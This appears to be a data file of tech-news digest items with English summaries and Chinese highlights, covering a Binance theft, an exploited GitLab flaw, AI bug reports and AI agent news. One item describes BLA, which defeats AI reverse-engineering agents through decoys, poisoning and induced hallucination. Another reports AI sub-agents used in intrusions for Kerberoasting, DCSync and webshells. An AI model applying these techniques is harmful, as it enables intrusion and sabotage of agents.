items.highlight: 币安被盗约 63 亿美元后分阶段恢复提现，用用户安全资产基金和自有资金补足九成被盗资产，承诺用户不承担损失，FBI 指认朝鲜 TraderTraitor 组织所为，事件已推高市场避险情绪。
items.excerpt: The cryptocurrency exchange Binance has started to allow its customers to withdraw their funds from the platform, as it recovers from a record $6.3bn (£4.7bn) hack. The exchange was hit by the theft on Thursday, which has since been described as the biggest heist in history, with experts identifying North Korea as the likely culprit.

items.title: Max-Severity GitLab Vulnerability Exploited Against Alpine Linux (2 minute read)
items.summary: CVE-2026-97229, a CVSS 10 flaw in Ruby's Onigmo regex engine, lets unauthenticated attackers execute code through crafted GitLab CI/CD configurations. Attackers targeted Alpine Linux on October 20 to 21, crashed worker processes, and downloaded its container image. Alpine found no confirmed code execution or repository tampering, rebuilt the instance, and reset passwords. CISA added the bug to KEV. GitLab-only updates may be insufficient for custom Ruby deployments. Use Ruby 3.3.13, 3.4.12, 4.0.9, or later.
items.score_reason: CVSS 10 的 GitLab 漏洞被实际利用的时间线。
items.highlight: 根因在 Ruby 正则引擎 Onigmo 的整数溢出，GitLab 满分 RCE 漏洞披露一周后即被用于攻击 Alpine Linux 实例，攻击未成功但该发行版重建实例并重置全部密码，CISA 已列入 KEV。
items.excerpt: A recent code execution vulnerability in GitLab was exploited one week after disclosure in a failed attack against Alpine Linux's instance. Tracked as CVE-2026-97229 (CVSS score of 10/10), the flaw stems from insufficient regular expression validation in Onigmo, Ruby's regular expression engine.

items.title: AI is finding bugs faster than PostgreSQL maintainers can review fixes (2 minute read)
items.summary: A surge in AI-assisted bug reports and patches helped push PostgreSQL 19 past its usual fall release window. Maintainers still have to verify proposed fixes and apply them to older versions. The project is targeting November 19 for release.
items.score_reason: AI 辅助补丁过多让维护者审查成为瓶颈。
items.highlight: PostgreSQL 19 因 AI/LLM 涌入大量缺陷报告与补丁而延期到至少 11 月；Haas 说 LLM 起草的修复仍需人工审阅，且本应用于发布评审的时间被积压的安全与回移修复占用。
items.excerpt: The PostgreSQL database server typically sees its annual feature release every September~October, but it's not coming until at least November if not longer this year. Due to the increased developer burden due to increased bug reporting and patches via AI/LLM activity, the PostgreSQL developers have been overwhelmed.

items.title: Waymo picks Toyota bZ4X as its next robotaxi, starting in Japan in 2027 (5 minute read)
items.summary: Toyota will build a custom version of its bZ4X electric SUV with the Waymo Driver integrated right on the line.
items.score_reason: Waymo 下一代robotaxi 车型与落地地点。
items.highlight: 丰田在日本高冈工厂把 Waymo Driver 直接集成进 bZ4X 产线，2027 年在日本投放测试车队、随后进入英国；这台「无聊但可靠」的量产车正解 Waymo 的产能瓶颈。
items.excerpt: Waymo is adding the Toyota bZ4X to its robotaxi lineup. Toyota will build a custom version of the electric SUV with the Waymo Driver integrated right on the line in Japan, and a test fleet will start operating there in 2027.

items.title: dsh-superagent (GitHub Repo)

It can watch GitHub, open work items, work in its own agent session and directory, and answer in the original conversation. It only acts when asked or when a rule the team wrote allows it, and it only speaks when someone must act or can use a result.
items.score_reason: 编码代理仓库，工程集成方式值得一看。
items.highlight: DeepSeek 开源 dsh-superagent 原型，让编码代理监听 GitHub、按需开工作项并在独立会话里干活、以 PR 回复，原则是尽量少占用团队注意力。
items.excerpt: dsh-superagent is a proactive coding agent for one GitHub repository, packaged as a bundle for DeepSeek Harness. It listens to GitHub and, optionally, Feishu. When someone allowed asks the agent for work, it opens a work item, works on it in its own agent session and directory, and answers in the original conversation, for example with a pull request.

items.title: DoorDash said it's only received 'several hundred' orders from AI agents (2 minute read)
items.summary: DoorDash revealed it has received "several hundred" orders from AI agents, despite processing 3 million deliveries daily. CEO Tony Xu highlighted that most orders still come directly from the DoorDash app, but the company is interested in exploring agentic use cases. DoorDash is also developing its own agents and considering future advertising opportunities within these platforms.
items.score_reason: AI 代理下单量的真实渗透数据。
items.highlight: DoorDash 三季度仅从第三方 AI 代理收到数百单，而平台日均配送三百万单，代理订餐仍属极早期；CEO 称既不逆势也不要自欺，愿与代理方边做边看。
items.excerpt: There's a big uproar about AI agents taking over commerce and orders, but that might not be the case just yet. Delivery company DoorDash revealed during its third-quarter earnings call that it has only seen "several hundred" orders from third-party agents like Muse, Instinct, Fo, and others.

items.title: Supporting a shared AI training control for websites (2 minute read)
items.summary: Google announced plans to support a shared AI training control via robots.txt, allowing websites to set AI training preferences with a single policy token.
items.score_reason: robots.txt 统一 AI 训练偏好的提案。
items.highlight: 谷歌宣布将在robots.txt支持IETF AIPREF的共享训练偏好标记，网站一次退订即可对多家AI厂商生效，未单列Google-Extended时视同禁止，计划2027年支持。
items.excerpt: Today, we're announcing our plans to support a shared AI training control in robots.txt. This will help websites express their AI training preferences across multiple AI providers in a single step and is based on work from the AIPREF working group at the Internet Engineering Task Force (IETF).

items.title: BLA: Blind LLM Agents (GitHub Repo)
items.summary: BLA is a tool to harden binaries against agentic reverse engineering. When an AI reverse engineering agent opens the binary, the analyzer his resource budgets, follows decoys, and burns tokens.
items.score_reason: 对抗代理逆向工程的花指令工具。
items.highlight: BLA 用投毒、耗尽预算、诱发幻觉三步对抗 AI 逆向代理：给二进制、WASM、Electron 等产物塞假证据并撑爆分析器上限，运行时行为不变，但成本倍数是自估。
items.excerpt: Point BLA at the build you ship. When an AI reverse-engineering agent (REA) opens it, the analyzer hits resource budgets, follows decoys, and burns tokens — while your users still get the same runtime behavior.

items.title: Google Cloud lets teams cap project spending (3 minute read)
items.summary: Google Cloud has made spend caps generally available for eligible services. Teams can use the Cloud Billing Budgets API to give every new sandbox project a spending limit, then raise or remove it when a developer needs more room.
items.score_reason: 云项目支出上限的正式可用与 API 用法。
items.highlight: Google Cloud 预算花费上限正式可用，三项改进是 API 批量下发、AI 服务分钟级实时成本报表与每月自动重置，超支只停按需与 CUD 调用，不删除任何资源。
items.excerpt: Today, we're announcing that spend caps on Google Cloud Budgets are generally available. With this release, we're delivering ways to protect your workloads from runaway costs without risking resource deletion.

items.title: Linux 7.4 sets a record with nearly 20,000 commits (2 minute read)

items.title: Agentic Offensive Frameworks Hit Real Intrusions (34 minute read)
items.summary: Google Threat Intelligence Group (GTIG) and Mandiant observed intruders using the open-source ARTEX framework with stolen credentials and letting its six sub-agents run Azure and AWS permission sweeps, Kerberoasting, DCSync, and MySQL log poisoning that wrote JSP webshells in bursts as short as 2 to 25 seconds. ARTEX users included financially motivated extortion groups and suspected PRC-nexus clusters such as UNC7228, which went from a first account to deep access in about four hours, though GTIG noted the agents were forensically noisy and sometimes undid each other's work. Mandiant recommended short-lived, tightly scoped credentials, locking down admin interfaces like Kudu/SCM as privileged infrastructure, and behavioral detection tuned for machine-speed bursts.
